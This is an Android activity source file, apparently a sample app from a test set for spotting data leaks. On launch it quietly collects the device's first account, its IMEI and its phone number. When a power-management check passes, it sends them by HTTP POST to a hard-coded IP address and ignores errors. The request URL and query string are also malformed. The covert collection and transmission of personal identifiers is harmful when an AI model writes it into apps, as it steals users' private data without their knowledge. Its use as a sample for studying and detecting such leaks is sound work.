package com.example.flymaple.test5;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.os.PowerManager;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;

//SuBatt
public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        AccountManager am = AccountManager.get(this);
        Account[] as = am.getAccounts();
        Account account = null;
        if(as!=null){
            account = as[0];
        }
        TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        String deviceId = tm.getDeviceId();
        String phone = tm.getLine1Number();
        PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
        boolean saveModeState = pm.isWakeLockLevelSupported(0);

        if(saveModeState){
            HttpClient hc = new DefaultHttpClient();
            try{
                hc.execute(new HttpPost("192.1.12.23"+"?imei"+deviceId+"&num"+phone+"account"+account.toString()));
            }catch (Exception e){}
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
